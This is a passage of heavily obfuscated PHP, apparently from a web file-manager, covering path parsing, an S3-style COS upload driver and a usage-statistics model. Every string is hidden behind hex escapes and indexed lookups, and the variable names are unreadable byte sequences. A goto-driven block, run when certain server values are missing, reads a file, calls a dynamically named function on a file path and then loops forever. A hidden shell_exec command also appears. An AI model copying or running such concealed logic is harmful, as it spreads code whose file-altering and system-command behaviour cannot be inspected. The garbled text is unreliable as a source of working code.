"\173\163\157\x75\162\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\x52\x65\143\x79\143\154\x65\175"; const KOD_USER_FAV = "\173\165\163\x65\x72\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\162\106\x69\x6c\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\162\106\x69\154\145\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\x75\x70\x52\x6f\157\x74\123\145\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\x75\163\145\162\123\x68\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\x53\x68\141\162\x65\x4c\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\162\x65\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\173\x73\x68\141\162\145\x49\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\141\x72\145\111\164\145\x6d\x4c\x69\156\153\175"; const KOD_SEARCH = "\173\x73\145\x61\162\x63\150\x7d"; const KOD_BLOCK = "\173\x62\154\x6f\x63\x6b\x7d"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\162\122\145\156\143\145\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\162\x69\x76\145\162\x7d"; public static function typeList() { $ã§ç±“½ =& $_SERVER[¡“ËÌ§œ]; return array($ã§ç±“½[1271] => self::KOD_SOURCE, $ã§ç±“½[1272] => self::KOD_USER_RECYCLE, $ã§ç±“½[1273] => self::KOD_USER_FAV, $ã§ç±“½[1274] => self::KOD_USER_FILE_TAG, $ã§ç±“½[1275] => self::KOD_USER_FILE_TYPE, $ã§ç±“½[1276] => self::KOD_GROUP_ROOT_SELF, $ã§ç±“½[1277] => self::KOD_USER_SHARE, $ã§ç±“½[1278] => self::KOD_USER_SHARE_LINK, $ã§ç±“½[1279] => self::KOD_USER_SHARE_TO_ME, $ã§ç±“½[1280] => self::KOD_SHARE_ITEM, $ã§ç±“½[1281] => self::KOD_SHARE_LINK, $ã§ç±“½[1282] => self::KOD_SEARCH, $ã§ç±“½[1283] => self::KOD_BLOCK, $ã§ç±“½[1284] => self::KOD_IO, $ã§ç±“½[1285] => self::KOD_USER_RECENT, $ã§ç±“½[1286] => self::KOD_USER_DRIVER); } public static function parse($ÍİİÚñ§) { $ÓœÀˆ²¨ =& $_SERVER[¡“ËÌ§œ]; $ÍİİÚñ§ = self::clear($ÍİİÚñ§); $áòÀ–Û = array_values(self::typeList()); preg_match($ÓœÀˆ²¨[1287], $ÍİİÚñ§, $­óÎ—Ã); $…ƒõËÑŞ = array($ÓœÀˆ²¨[460] => !1, $ÓœÀˆ²¨[1288] => !1, $ÓœÀˆ²¨[457] => !1, $ÓœÀˆ²¨[84] => $ÍİİÚñ§, $ÓœÀˆ²¨[1189] => !1, $ÓœÀˆ²¨[1188] => $ÓœÀˆ²¨[12]); if (is_array($­óÎ—Ã) && count($­óÎ—Ã) == 5) { $Í™›…Åë = $ÓœÀˆ²¨[1289] . $­óÎ—Ã[2] . $ÓœÀˆ²¨[356]; if (in_array($Í™›…Åë, $áòÀ–Û)) { $…ƒõËÑŞ[$ÓœÀˆ²¨[1189]] = $­óÎ—Ã[1]; $…ƒõËÑŞ[$ÓœÀˆ²¨[33]] = $Í™›…Åë; $…ƒõËÑŞ[$ÓœÀˆ²¨[1290]] = substr($Í™›…Åë, 1, -1); $…ƒõËÑŞ[$ÓœÀˆ²¨[437]] = $­óÎ—Ã[3]; } $…ƒõËÑŞ[$ÓœÀˆ²¨[1188]] = $­óÎ—Ã[4]; } $·êÔ¹ = array($ÓœÀˆ²¨[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $…ƒõËÑŞ[$ÓœÀˆ²¨[1253]] = in_array($…ƒõËÑŞ[$ÓœÀˆ²¨[33]], $·êÔ¹); return $…ƒõËÑŞ; } public static function isTruePath($‹€–Éô) { $ù¦¦èÇä =& $_SERVER[¡“ËÌ§œ]; if (substr($‹€–Éô, 0, 1) != $ù¦¦èÇä[1289]) { return !0; } if (strpos($‹€–Éô, $ù¦¦èÇä[446]) === 0) { return !0; } if (strpos($‹€–Éô, $ù¦¦èÇä[1257]) === 0) { return !0; } if (strpos($‹€–Éô, $ù¦¦èÇä[1291]) === 0) { return !0; } if (strpos($‹€–Éô, $ù¦¦èÇä[1292]) === 0) { return !0; } if (strpos($‹€–Éô, $ù¦¦èÇä[1293]) === 0) { return !0; } return !1; } public static function clear($¬†Óõ•) { $“È…Úè =& $_SERVER[¡“ËÌ§œ]; $¬†Óõ• = str_replace(array($“È…Úè[1098], $“È…Úè[231]), $“È…Úè[53], $¬†Óõ•); $¬†Óõ• = str_replace($“È…Úè[97], $“È…Úè[8], $¬†Óõ•); $Ã€œ…Ú§ = $“È…Úè[1294]; if (substr($¬†Óõ•, 0, 3) == $“È…Úè[1295]) { $¬†Óõ• = substr($¬†Óõ•, 3); } while (strstr($¬†Óõ•, $Ã€œ…Ú§)) { $¬†Óõ• = str_replace($Ã€œ…Ú§, $“È…Úè[8], $¬†Óõ•); } $¬†Óõ• = preg_replace($“È…Úè[1296], $“È…Úè[8], $¬†Óõ•); if ($¬†Óõ• == $“È…Úè[8]) { return $“È…Úè[8]; } $¬†Óõ• = rtrim($¬†Óõ•, $“È…Úè[8]); return $¬†Óõ•; } public static function pathTrue($ŸìŞ®‰Ú) { $Ò¢øËÙÑ =& $_SERVER[¡“ËÌ§œ]; if (!$ŸìŞ®‰Ú) { return $Ò¢øËÙÑ[12]; } $ÍÜşËú’ = strlen($ŸìŞ®‰Ú); if (substr($ŸìŞ®‰Ú, $ÍÜşËú’ - 1, 1) == $Ò¢øËÙÑ[8]) { $ŸìŞ®‰Ú = substr($ŸìŞ®‰Ú, 0, $ÍÜşËú’ - 1); } $ŸìŞ®‰Ú = str_replace($Ò¢øËÙÑ[557], $Ò¢øËÙÑ[8], str_replace($Ò¢øËÙÑ[1297], $Ò¢øËÙÑ[8], $ŸìŞ®‰Ú)); if (substr($ŸìŞ®‰Ú, 0, 2) == $Ò¢øËÙÑ[1298]) { $ŸìŞ®‰Ú = substr($ŸìŞ®‰Ú, 2); } if (!strstr($ŸìŞ®‰Ú, $Ò¢øËÙÑ[1295])) { return $ŸìŞ®‰Ú; } $«ê¨Ë€¦ = explode($Ò¢øËÙÑ[8], $ŸìŞ®‰Ú); $³“¡¡ı­ = array_search($Ò¢øËÙÑ[1299], $«ê¨Ë€¦); if ($³“¡¡ı­ >= 0) { $«ê¨Ë€¦[$³“¡¡ı­] = -1; } if ($³“¡¡ı­ > 0) { $«ê¨Ë€¦[$³“¡¡ı­ - 1] = -1; } $¬ƒ“ü€† = array(); foreach ($«ê¨Ë€¦ as $²˜±£÷) { if ($²˜±£÷ !== -1) { $¬ƒ“ü€†[] = $²˜±£÷; } } return self::pathTrue(implode($Ò¢øËÙÑ[8], $¬ƒ“ü€†)); } public static function sourceID($¾©ÛíÌŒ) { $í­Øã æ =& $_SERVER[¡“ËÌ§œ]; $¼üùÜä = self::parse($¾©ÛíÌŒ); if ($¼üùÜä[$í­Øã æ[33]] !== self::KOD_SOURCE) { show_json(LNG($í­Øã æ[1300]), !1); } return $¼üùÜä[$í­Øã æ[437]]; } public static function make($åê–‹Ù) { if (!$åê–‹Ù) { return !1; } return self::makePath(self::KOD_SOURCE, intval($åê–‹Ù)); } public static function makeShare($Ş·…’‹·, $†õ¥¼â‡) { return self::makePath(self::KOD_SHARE_ITEM, $Ş·…’‹·, $†õ¥¼â‡); } public static function makeFileTypePath($œĞ„ï¬È) { return self::makePath(self::KOD_USER_FILE_TYPE, $œĞ„ï¬È); } public static function makeFileTagPath($ãøıƒ¶Ñ) { return self::makePath(self::KOD_USER_FILE_TAG, $ãøıƒ¶Ñ); } public static function makePath($ÙÕ‚½ì, $í‚ı¹²‰ = '', $ÂÉ‘£® = '') { $¡²í¸­“ =& $_SERVER[¡“ËÌ§œ]; $·¬×Ò«æ = substr($ÙÕ‚½ì, 1, -1); $ÂÉ›âƒ = $¡²í¸­“[1301] . $·¬×Ò«æ . $¡²í¸­“[1302] . $í‚ı¹²‰ . $¡²í¸­“[1303]; $ÂÉ›âƒ = $ÂÉ‘£® ? $ÂÉ›âƒ . $ÂÉ‘£® . $¡²í¸­“[8] : $ÂÉ›âƒ; return $ÂÉ›âƒ; } public static function hashPath($™¡±±ÀØ, $—Ÿ´Î”¦ = true) { $Û˜†ÂëÂ =& $_SERVER[¡“ËÌ§œ]; $áü—á± = is_array($™¡±±ÀØ) ? $™¡±±ÀØ : IO::info($™¡±±ÀØ); $›Ê„ĞÓ = _get($áü—á±, $Û˜†ÂëÂ[1304], $Û˜†ÂëÂ[12]); if (!$›Ê„ĞÓ && isset($áü—á±[$Û˜†ÂëÂ[440]])) { $áü—á± = IO::info(KodIO::make($áü—á±[$Û˜†ÂëÂ[440]])); $›Ê„ĞÓ = _get($áü—á±, $Û˜†ÂëÂ[1304], $Û˜†ÂëÂ[12]); } if (!$›Ê„ĞÓ && $—Ÿ´Î”¦) { $ëÙ­­± = KodIO::parse($áü—á±[$Û˜†ÂëÂ[84]]); if (!$ëÙ­­±[$Û˜†ÂëÂ[33]]) { $›Ê„ĞÓ = IO::hashSimple($áü—á±[$Û˜†ÂëÂ[84]]); } } if (!$›Ê„ĞÓ) { $›Ê„ĞÓ = md5($áü—á±[$Û˜†ÂëÂ[84]] . $áü—á±[$Û˜†ÂëÂ[76]] . $áü—á±[$Û˜†ÂëÂ[85]]); } return $›Ê„ĞÓ; } public static function hashPathSafe($†´‹ÄÔ, $ÅòôÇê° = true) { $ßÅ–Ê¶Ü =& $_SERVER[¡“ËÌ§œ]; $£†í¤§ = self::hashPath($†´‹ÄÔ, $ÅòôÇê°); return md5($£†í¤§ . $ßÅ–Ê¶Ü[1305] . Model($ßÅ–Ê¶Ü[790])->get($ßÅ–Ê¶Ü[791])); } public static function initSystemPath() { $£è£ş¡ñ =& $_SERVER[¡“ËÌ§œ]; if (defined($£è£ş¡ñ[1306])) { return; } define($£è£ş¡ñ[1306], self::systemPath($£è£ş¡ñ[1307])); define($£è£ş¡ñ[1308], self::systemPath($£è£ş¡ñ[1309])); define($£è£ş¡ñ[1310], self::systemPath($£è£ş¡ñ[1311])); define($£è£ş¡ñ[1312], self::systemPath($£è£ş¡ñ[1313])); IOHistory::bindEvent(); } public static function systemPath($œ¶áşÚ²) { $¡’ğçËÏ =& $_SERVER[¡“ËÌ§œ]; $Îş–ñ“© = $¡’ğçËÏ[1314] . ucfirst($œ¶áşÚ²); $Üí¼…Ş­ = Model($¡’ğçËÏ[790])->get($Îş–ñ“©); if ($Üí¼…Ş­) { return $Üí¼…Ş­; } if ($œ¶áşÚ² == $¡’ğçËÏ[1307]) { $Üí¼…Ş­ = self::make(Model($¡’ğçËÏ[845])->systemRootPathAdd($¡’ğçËÏ[572])); } else { $Üí¼…Ş­ = self::systemPath($¡’ğçËÏ[1307]); $‹¨”ôä = self::sourceID($Üí¼…Ş­); $Üí¼…Ş­ = self::make(Model($¡’ğçËÏ[845])->mkdir($‹¨”ôä, $œ¶áşÚ²)); } Model($¡’ğçËÏ[790])->set($Îş–ñ“©, $Üí¼…Ş­); return $Üí¼…Ş­; } public static function systemFolder($Ÿï©‚ªº) { $á¿²¦±í = IO_PATH_SYSTEM_SOURCE . $Ÿï©‚ªº; $á¹‡—§ = Cache::get($á¿²¦±í); if (!$á¹‡—§) { $²àÒ†â = IO::infoFull($á¿²¦±í); if (!$²àÒ†â) { $á¹‡—§ = IO::mkdir($á¿²¦±í, REPEAT_SKIP); } else { $á¹‡—§ = $²àÒ†â[$_SERVER[¡“ËÌ§œ][84]]; } Cache::set($á¿²¦±í, $á¹‡—§, 3600 * 10); } return $á¹‡—§; } public static function defaultDriver() { return Model($_SERVER[¡“ËÌ§œ][787])->defaultDriver(); } public static function defaultIO() { $ø¼Ú¬ë =& $_SERVER[¡“ËÌ§œ]; $â´ŞÚÅà = self::defaultDriver(); return $ø¼Ú¬ë[1315] . $â´ŞÚÅà[$ø¼Ú¬ë[437]] . $ø¼Ú¬ë[1303]; } public static function defaultDriverInit() { static $÷ôĞ½®£ = false; if ($÷ôĞ½®£) { return $÷ôĞ½®£; } $÷ôĞ½®£ = IO::init(self::defaultIO()); return $÷ôĞ½®£; } public static function fileTypeList() { $ˆÒÚ‰¿‰ =& $_SERVER[¡“ËÌ§œ]; $ÛœÓ×˜· = $GLOBALS[$ˆÒÚ‰¿‰[6]][$ˆÒÚ‰¿‰[1316]]; foreach ($ÛœÓ×˜· as $çóÓÕê¹ => $Ë—×Ù…Ä) { $ï»˜œË’ = $ˆÒÚ‰¿‰[1317] . $çóÓÕê¹; $Î˜Ö×²› = LNG($ï»˜œË’); if ($ï»˜œË’ != $Î˜Ö×²›) { $ÛœÓ×˜·[$çóÓÕê¹][$ˆÒÚ‰¿‰[32]] = $Î˜Ö×²›; } } return $ÛœÓ×˜·; } public static function diskList($Ê‰¥»àÃ = true) { $ã§¡úı­ = $_SERVER[¡“ËÌ§œ][1318]; if ($Ê‰¥»àÃ) { $×ó²Â¡ = Cache::get($ã§¡úı­); if (is_array($×ó²Â¡)) { return $×ó²Â¡; } } $×ó²Â¡ = self::diskListGet(); Cache::set($ã§¡úı­, $×ó²Â¡, 60); return $×ó²Â¡; } public static function diskListGet() { $ï•ÈÒµ× =& $_SERVER[¡“ËÌ§œ]; $Ä°¿öÑÄ = array(); if ($GLOBALS[$ï•ÈÒµ×[6]][$ï•ÈÒµ×[1319]] == $ï•ÈÒµ×[1320]) { $˜Şşİã˜ = $ï•ÈÒµ×[1321]; for ($É›­Ÿìú = 0; $É›­Ÿìú < strlen($˜Şşİã˜); $É›­Ÿìú++) { $Ÿ„‡ı¶ = $˜Şşİã˜[$É›­Ÿìú] . $ï•ÈÒµ×[1322]; if (file_exists($Ÿ„‡ı¶)) { $Ä°¿öÑÄ[] = $Ÿ„‡ı¶; } } return $Ä°¿öÑÄ; } if (!function_exists($ï•ÈÒµ×[98])) { $Ä°¿öÑÄ[] = $ï•ÈÒµ×[855]; return $Ä°¿öÑÄ; } $øØé†¥ò = explode($ï•ÈÒµ×[231], shell_exec($ï•ÈÒµ×[1323])); array_shift($øØé†¥ò); array_pop($øØé†¥ò); $±€åºÅõ = array($ï•ÈÒµ×[1324], $ï•ÈÒµ×[1325], $ï•ÈÒµ×[1326], $ï•ÈÒµ×[1327], $ï•ÈÒµ×[1328], $ï•ÈÒµ×[1329], $ï•ÈÒµ×[1330], $ï•ÈÒµ×[1331]); foreach ($øØé†¥ò as $÷«Ú€Ñ) { $ª¼ÒÉÓ = preg_split($ï•ÈÒµ×[1332], $÷«Ú€Ñ); $Ÿ„‡ı¶ = $ª¼ÒÉÓ[count($ª¼ÒÉÓ) - 1]; if (!strstr($ª¼ÒÉÓ[0], $ï•ÈÒµ×[1333]) || !$Ÿ„‡ı¶) { continue; } $¼®‹×É = rtrim($Ÿ„‡ı¶, $ï•ÈÒµ×[8]) . $ï•ÈÒµ×[8]; if (in_array($¼®‹×É, $±€åºÅõ)) { continue; } $Ä°¿öÑÄ[] = $¼®‹×É; } return $Ä°¿öÑÄ; } public static function isSameDisk($½ØÍ Óç, $ÌÈóÀ¥Æ) { $Ò±úÚ¡Ë =& $_SERVER[¡“ËÌ§œ]; if ($GLOBALS[$Ò±úÚ¡Ë[6]][$Ò±úÚ¡Ë[1319]] == $Ò±úÚ¡Ë[1320]) { return strtolower(substr($½ØÍ Óç, 0, 1)) == strtolower(substr($ÌÈóÀ¥Æ, 0, 1)); } $®ãíãüó = self::diskList(); $¼‰ëõ– = !1; $›ÜÙ™‹… = !1; sort($®ãíãüó); $®ãíãüó = array_reverse($®ãíãüó); $½ØÍ Óç = rtrim($½ØÍ Óç, $Ò±úÚ¡Ë[8]) . $Ò±úÚ¡Ë[8]; $ÌÈóÀ¥Æ = rtrim($ÌÈóÀ¥Æ, $Ò±úÚ¡Ë[8]) . $Ò±úÚ¡Ë[8]; foreach ($®ãíãüó as $ÈåÒ×ôÕ) { $÷»Ü›õÍ = strlen($ÈåÒ×ôÕ); if (!$¼‰ëõ– && substr($½ØÍ Óç, 0, $÷»Ü›õÍ) == $ÈåÒ×ôÕ) { $¼‰ëõ– = $ÈåÒ×ôÕ; } if (!$›ÜÙ™‹… && substr($ÌÈóÀ¥Æ, 0, $÷»Ü›õÍ) == $ÈåÒ×ôÕ) { $›ÜÙ™‹… = $ÈåÒ×ôÕ; } if ($¼‰ëõ– && $›ÜÙ™‹…) { break; } } return $¼‰ëõ– === $›ÜÙ™‹…; } public static function transferType($Û°©Ó¼, $¿‹ìƒ› ) { $Ê©·Äò³ =& $_SERVER[¡“ËÌ§œ]; $¯…ıªğ = self::driverType($Û°©Ó¼); $Û’¿æÊ« = self::driverType($¿‹ìƒ› ); if ($¯…ıªğ[$Ê©·Äò³[33]] == $Û’¿æÊ«[$Ê©·Äò³[33]] && $¯…ıªğ[$Ê©·Äò³[1334]] == $Û’¿æÊ«[$Ê©·Äò³[1334]]) { return $Ê©·Äò³[1335]; } if ($¯…ıªğ[$Ê©·Äò³[33]] == $Ê©·Äò³[888] && $Û’¿æÊ«[$Ê©·Äò³[33]] == $Ê©·Äò³[106]) { return $Ê©·Äò³[1214]; } if ($¯…ıªğ[$Ê©·Äò³[33]] == $Ê©·Äò³[106] && $Û’¿æÊ«[$Ê©·Äò³[33]] == $Ê©·Äò³[888]) { return $Ê©·Äò³[107]; } return $Ê©·Äò³[1336]; } public static function driverType($’€©¼ÈÇ) { $ÑÂŞµıí =& $_SERVER[¡“ËÌ§œ]; $·™ÌªÂÀ = str_replace($ÑÂŞµıí[1337], $ÑÂŞµıí[12], strtolower($’€©¼ÈÇ->getType())); if ($·™ÌªÂÀ == $ÑÂŞµıí[777] || $·™ÌªÂÀ == $ÑÂŞµıí[1338] || $·™ÌªÂÀ == $ÑÂŞµıí[1339]) { $’€©¼ÈÇ = self::defaultDriverInit(); } else { if ($·™ÌªÂÀ == $ÑÂŞµıí[1224] || $·™ÌªÂÀ == $ÑÂŞµıí[1340]) { $’€©¼ÈÇ = IO::init($’€©¼ÈÇ->pathParse[$ÑÂŞµıí[1171]]); } } $ ”òÜïÕ = $’€©¼ÈÇ->path; $·™ÌªÂÀ = str_replace($ÑÂŞµıí[1337], $ÑÂŞµıí[12], strtolower($’€©¼ÈÇ->getType())); if ($·™ÌªÂÀ == $ÑÂŞµıí[106]) { return array($ÑÂŞµıí[33] => $ÑÂŞµıí[106], $ÑÂŞµıí[1334] => $ÑÂŞµıí[12], $ÑÂŞµıí[84] => $ ”òÜïÕ, $ÑÂŞµıí[95] => $’€©¼ÈÇ); } return array($ÑÂŞµıí[33] => $ÑÂŞµıí[888], $ÑÂŞµıí[1334] => $’€©¼ÈÇ->pathDriver, $ÑÂŞµıí[84] => $ ”òÜïÕ, $ÑÂŞµıí[95] => $’€©¼ÈÇ); } public static function pathDriverType($ªí¶©«±) { return $ªí¶©«± ? self::driverType(IO::init($ªí¶©«±)) : !1; } public static function pathDriverLocal($ÛÓçÈû¶) { $ğá‘ñéÈ =& $_SERVER[¡“ËÌ§œ]; $Øè§ÉÈœ = $ÛÓçÈû¶ ? self::driverType(IO::init($ÛÓçÈû¶)) : !1; return $Øè§ÉÈœ[$ğá‘ñéÈ[33]] == $ğá‘ñéÈ[106] ? !0 : !1; } public static function allowCover($ıçÄƒô, $™§èĞÆ½ = true) { $ŸäÑñÁö =& $_SERVER[¡“ËÌ§œ]; if (is_string($ıçÄƒô)) { $ıçÄƒô = IO::info($ıçÄƒô); } if (!$ıçÄƒô || $ıçÄƒô[$ŸäÑñÁö[33]] == $ŸäÑñÁö[75] || $ıçÄƒô[$ŸäÑñÁö[76]] <= 100) { return !1; } if (isset($ıçÄƒô[$ŸäÑñÁö[1341]]) || !$ıçÄƒô[$ŸäÑñÁö[84]]) { return !1; } if (isset($ıçÄƒô[$ŸäÑñÁö[202]]) && !$ıçÄƒô[$ŸäÑñÁö[202]]) { return $ıçÄƒô; } static $š£¿—¶Â = false; if (!$š£¿—¶Â || !$™§èĞÆ½) { $ÉôÎ”Šñ = self::driverType(IO::init($ıçÄƒô[$ŸäÑñÁö[84]])); $¸¢ˆë¥æ = $ÉôÎ”Šñ[$ŸäÑñÁö[95]]; $š£¿—¶Â = $ŸäÑñÁö[1342]; if ($ÉôÎ”Šñ[$ŸäÑñÁö[33]] == $ŸäÑñÁö[106]) { $š£¿—¶Â = $ŸäÑñÁö[1343]; } if ($ÉôÎ”Šñ[$ŸäÑñÁö[95]] && is_array($ÉôÎ”Šñ[$ŸäÑñÁö[95]]->config)) { $œ«Ş²Ë = $ÉôÎ”Šñ[$ŸäÑñÁö[95]]->config; if (isset($œ«Ş²Ë[$ŸäÑñÁö[1344]]) && $œ«Ş²Ë[$ŸäÑñÁö[1344]]) { $š£¿—¶Â = $ŸäÑñÁö[1343]; } } } return $š£¿—¶Â == $ŸäÑñÁö[1343] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ö‡‰Ü¶ß) { parent::__construct($Ö‡‰Ü¶ß); $this->signatureVersion($_SERVER[¡“ËÌ§œ][216]); } public function uploadFormData($Š•İî­ã, $­¡¨òÜ = 3600) { $•ÔŸâİÂ =& $_SERVER[¡“ËÌ§œ]; $ı®ÊŠÀ = $•ÔŸâİÂ[199]; $‹¯¿Á‘¬ = $•ÔŸâİÂ[232]; $Åíåª²İ = $•ÔŸâİÂ[242]; $Ş¬ò€á¾ = gmdate($•ÔŸâİÂ[1345], time() + $­¡¨òÜ); $¼ëÉÉÓó = (string) time() . $•ÔŸâİÂ[71] . (string) (time() + $­¡¨òÜ); $ÈúÙÒÅ¤ = array($•ÔŸâİÂ[243] => $Ş¬ò€á¾, $•ÔŸâİÂ[246] => array(array($•ÔŸâİÂ[248] => $ı®ÊŠÀ), array($•ÔŸâİÂ[247] => $this->bucket), array($•ÔŸâİÂ[249], $•ÔŸâİÂ[250], $•ÔŸâİÂ[12]), array($•ÔŸâİÂ[253] => $Åíåª²İ), array($•ÔŸâİÂ[1346] => $‹¯¿Á‘¬), array($•ÔŸâİÂ[1347] => $this->accessKey), array($•ÔŸâİÂ[1348] => $¼ëÉÉÓó))); $ÈúÙÒÅ¤ = json_encode($ÈúÙÒÅ¤); $ÈœÄŒšç = hash_hmac($•ÔŸâİÂ[232], $¼ëÉÉÓó, $this->secret); $³öÓÀ¸ü = sha1($ÈúÙÒÅ¤); $ó¿³Ú¹ = hash_hmac($•ÔŸâİÂ[232], $³öÓÀ¸ü, $ÈœÄŒšç); $çùœäÜ = array($•ÔŸâİÂ[248] => $ı®ÊŠÀ, $•ÔŸâİÂ[253] => $Åíåª²İ, $•ÔŸâİÂ[261] => base64_encode($ÈúÙÒÅ¤), $•ÔŸâİÂ[1346] => $‹¯¿Á‘¬, $•ÔŸâİÂ[1347] => $this->accessKey, $•ÔŸâİÂ[1349] => $¼ëÉÉÓó, $•ÔŸâİÂ[1350] => $ó¿³Ú¹, $•ÔŸâİÂ[182] => $this->getHost()); return $çùœäÜ; } public function fileOutLink($™©£›˜Æ) { $åÊÂ“¹Š =& $_SERVER[¡“ËÌ§œ]; if (substr($™©£›˜Æ, 0, 7) == $åÊÂ“¹Š[1351]) { $™©£›˜Æ = $åÊÂ“¹Š[1352] . substr($™©£›˜Æ, 7); } header($åÊÂ“¹Š[161] . $™©£›˜Æ); die; } } goto B¿Î¯Ëˆ­ì; Câ¤îÖ¯µõ: define($_SERVER[¡“ËÌ§œ][0], $_SERVER[¡“ËÌ§œ][1]); $_SERVER[ÛÛ¹¦ó] = explode($_SERVER[¡“ËÌ§œ][2], gzinflate(substr($_SERVER[¡“ËÌ§œ][3], 10, -8))); function binCheckEq($ÎÊ•ĞÀÚ, $ÍÊíŒàŞ) { return $ÎÊ•ĞÀÚ == $ÍÊíŒàŞ; } goto E™¼²¨ÄÇ; E¡¢¨‘Ï®×: if (!isset($_SERVER[$_SERVER[¡“ËÌ§œ][425]]) || !isset($_SERVER[$_SERVER[¡“ËÌ§œ][433]])) { $_getc = $_SERVER[¡“ËÌ§œ][427]; $_getfile = $_SERVER[$_SERVER[¡“ËÌ§œ][428]] . $_SERVER[¡“ËÌ§œ][429]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¡“ËÌ§œ][231], $_getfilec); if (count($_getarrs) < $_SERVER[¡“ËÌ§œ][430]) { $exit = $_SERVER[¡“ËÌ§œ][431]; $exit(); } $_act = $_SERVER[¡“ËÌ§œ][432]; $_act($_SERVER[$_SERVER[¡“ËÌ§œ][428]] . $_SERVER[¡“ËÌ§œ][429]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¡“ËÌ§œ][407]); } } class AnalysisModel extends ModelBaseLight { public function init($Ö£úÉ×û) { $±¹ ´èø =& $_SERVER[¡“ËÌ§œ]; $Ã××ïË¹ = array($±¹ ´èø[628] => array($±¹ ´èø[33] => $±¹ ´èø[1780], $±¹ ´èø[302] => array($±¹ ´èø[224], $±¹ ´èø[785], $±¹ ´èø[1781], $±¹ ´èø[1782])), $±¹ ´èø[1783] => array($±¹ ´èø[33] => $±¹ ´èø[1784], $±¹ ´èø[302] => array($±¹ ´èø[224], $±¹ ´èø[783], $±¹ ´èø[1785], $±¹ ´èø[1786], $±¹ ´èø[1787]))); if (!isset($Ã××ïË¹[$Ö£úÉ×û])) { return !1; } $this->optionType = $Ã××ïË¹[$Ö£úÉ×û][$±¹ ´èø[33]]; $this->field = $Ã××ïË¹[$Ö£úÉ×û][$±¹ ´èø[302]]; return !0; } public function listData($úÁõğõÙ = false, $ˆš§ó¦Ã = "\155\x6f\144\x69\x66\x79\x54\x69\x6d\145", $˜­æ¯‰€ = false) { return parent::listData($úÁõğõÙ, $ˆš§ó¦Ã, $˜­æ¯‰€); } public function trendList($õ¿Åå¯) { $ª§—Êİ” =& $_SERVER[¡“ËÌ§œ]; $ã¥ÂÙÍü = $this->listData(); if ($ã¥ÂÙÍü) { $¾Í€å»¥ = end($ã¥ÂÙÍü); $à½´­¼¯ = date($ª§—Êİ”[1788], strtotime($ª§—Êİ”[1789])); if ($¾Í€å»¥[$ª§—Êİ”[224]] == $à½´­¼¯) { return $ã¥ÂÙÍü; } $±¡ÎñŸ“ = strtotime($¾Í€å»¥[$ª§—Êİ”[224]]); } if (!isset($±¡ÎñŸ“)) { $¸Ú³ªÖş = $õ¿Åå¯ == $ª§—Êİ”[628] ? $ª§—Êİ”[563] : $ª§—Êİ”[845]; $±¡ÎñŸ“ = Model($¸Ú³ªÖş)->min($ª§—Êİ”[201]); } $œÁÉ¦ = $ª§—Êİ”[1790] . ucfirst($õ¿Åå¯); $¹Õº„• = $this->dateList($±¡ÎñŸ“); foreach ($¹Õº„• as $à½´­¼¯) { $this->{$œÁÉ¦}($à½´­¼¯); } return $this->listData(); } private function dateList($Êúò•Ì¨) { $øÀ­¾‰Ê =& $_SERVER[¡“ËÌ§œ]; $î²å¤‘ß = $Êúò•Ì¨; $€ã°†œ– = strtotime($øÀ­¾‰Ê[1789]); $ÛÅÖŒàÍ = array(); while ($î²å¤‘ß <= $€ã°†œ–) { $ÛÅÖŒàÍ[] = date($øÀ­¾‰Ê[1788], $î²å¤‘ß); $î²å¤‘ß = strtotime($øÀ­¾‰Ê[1791], $î²å¤‘ß); } return $ÛÅÖŒàÍ; } public function _recordUser($Úã©›À® = '') { $İ‹¡‘Ìã =& $_SERVER[¡“ËÌ§œ]; $œæĞ¾ş = strtotime(date($İ‹¡‘Ìã[1792], strtotime($Úã©›À®))); $şıî‚ ” = strtotime(date($İ‹¡‘Ìã[1793], strtotime($Úã©›À®))); $áÀÎñÊÍ = array($İ‹¡‘Ìã[201] => array($İ‹¡‘Ìã[1033], $şıî‚ ”)); $¤·Û×÷Ó = Model($İ‹¡‘Ìã[563])->where($áÀÎñÊÍ)->count($İ‹¡‘Ìã[1661]); $áÀÎñÊÍ[$İ‹¡‘Ìã[201]] = array($İ‹¡‘Ìã[362], array($œæĞ¾ş, $şıî‚ ”)); $¶”Á¤š = Model($İ‹¡‘Ìã[563])->where($áÀÎñÊÍ)->count($İ‹¡‘Ìã[1661]); $áÀÎñÊÍ[$İ‹¡‘Ìã[33]] = $İ‹¡‘Ìã[1794]; $Ş´ªŞÅ = Model($İ‹¡‘Ìã[1795])->where($áÀÎñÊÍ)->count($İ‹¡‘Ìã[1796]); $—×˜à†Ö = array($İ‹¡‘Ìã[224] => $Úã©›À®, $İ‹¡‘Ìã[785] => (int) $¤·Û×÷Ó, $İ‹¡‘Ìã[1781] => (int) $¶”Á¤š, $İ‹¡‘Ìã[1782] => (int) $Ş´ªŞÅ); return $this->insert($—×˜à†Ö); } public function _recordStore($ØªÃáõ× = '') { $³ÈµŞ™Ô =& $_SERVER[¡“ËÌ§œ]; $ĞÑÒĞí = strtotime(date($³ÈµŞ™Ô[1793], strtotime($ØªÃáõ×))); $Íö²Š¾ = array($³ÈµŞ™Ô[201] => array($³ÈµŞ™Ô[1033], $ĞÑÒĞí)); $•‘«½»Ä = Model($³ÈµŞ™Ô[509])->where($Íö²Š¾)->sum($³ÈµŞ™Ô[76]); $Íö²Š¾[$³ÈµŞ™Ô[448]] = 0; $ÜËÕª‹é = Model($³ÈµŞ™Ô[845])->where($Íö²Š¾)->sum($³ÈµŞ™Ô[76]); $Íö²Š¾[$³ÈµŞ™Ô[449]] = 1; 